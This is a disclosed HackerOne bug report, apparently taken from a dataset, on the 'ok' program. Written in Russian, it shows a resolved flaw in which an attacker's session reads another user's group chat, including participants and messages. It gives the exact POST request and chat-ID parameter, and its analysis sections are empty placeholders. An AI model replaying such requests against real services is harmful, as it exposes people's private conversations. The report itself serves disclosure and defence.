---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '79046'
original_report_id: '79046'
title: Доступ к чужим групповым беседам.
weakness: Privilege Escalation
team_handle: ok
created_at: '2015-07-27T15:03:58.936Z'
disclosed_at: '2016-04-29T09:59:15.869Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 3
tags:
- hackerone
- privilege-escalation
---

# Доступ к чужим групповым беседам.

## Metadata

- HackerOne Report ID: 79046
- Weakness: Privilege Escalation
- Program: ok
- Disclosed At: 2016-04-29T09:59:15.869Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

1. В аккаунте жертвы сделем групповой чат, в который не входит атакующий
2. Запомним параметр d.chi:64052989157445
3. Из сессии атакующего сделаем запрос информации о беседе.

> POST /settings/feed/apps?cmd=ToolbarMessages&gwt.requested=129bff65&st.cmd=userConfigFeed&st.type=2&p_sId=758860922374599189 HTTP/1.1

> tlb.act=act.rci&d.chi=64052989157445&d.coi=555409084413&d.wh=544&refId=mrcc-1438008870180

Получаем всю информацию о беседе:
- участники
- сообщения

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
